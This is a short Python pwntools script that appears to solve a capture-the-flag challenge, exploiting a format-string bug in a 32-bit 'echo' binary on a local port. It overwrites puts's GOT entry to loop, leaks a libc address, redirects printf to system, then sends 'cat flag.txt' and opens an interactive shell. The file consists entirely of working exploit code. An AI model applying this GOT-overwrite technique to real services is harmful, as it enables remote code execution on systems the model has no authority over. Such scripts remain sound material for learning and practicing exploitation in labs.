#!/bin/python3

import socket
import telnetlib
from pwn import *
import struct


#context.log_level='debug'
#context.terminal=['tmux','splitw','-h']

#p=process('./bin/echo')
p=remote('127.0.0.1',40005)
elf=ELF('./bin/echo')
#libc=ELF('/usr/lib32/libc-2.32.so')
libc=ELF('./libc-2.23.so')

#gdb.attach(p,"b*0x8049249\nx 0x8049050\nc")

puts_got=elf.got['puts']
printf_got=elf.got['printf']

loop_point=0x08049223
loop_point_h,loop_point_l=loop_point>>16,loop_point&0xffff
loop_point_h+=0x10000

print("puts_got:"+hex(puts_got))

p.recvuntil(b"say somthing!:")
#rewrite puts to scanf
payload=b'aaaa'+b'%6$s'
payload+=struct.pack("I",puts_got)
payload+=struct.pack("I",puts_got+0x2)
payload+=b'%'+str.encode(str(loop_point_l-4*6))+b"c"
payload+=b"%6$n"
payload+=b'%'+str.encode(str(loop_point_h-loop_point_l))+b"c"
payload+=b"%7$n"
payload+=b"end"
#x/x 0x804c018
p.sendline(payload)


leak_libc=struct.unpack("I",(p.recvuntil("end")[5:9]))[0]
print("leak_libc:"+hex(leak_libc))
libc_base=leak_libc-libc.symbols['puts']
libc_system=libc_base+libc.symbols['system']
print("libc.symbols['system']"+hex(libc.symbols['system']))
libc_system_h,libc_system_l=libc_system>>16,libc_system&0xffff

#rewrite printf
payload=b''
payload+=struct.pack("I",printf_got)
payload+=struct.pack("I",printf_got+0x2)
payload+=b'%'+str.encode(str(libc_system_l-2*4))+b"c"
payload+=b"%5$n"
payload+=b'%'+str.encode(str(libc_system_h-libc_system_l))+b"c"
payload+=b"%6$hn"
payload+=b"end"
# x 0x804c00c

p.sendline(payload)
p.recvuntil("end")

p.sendline('cat flag.txt')

p.interactive()
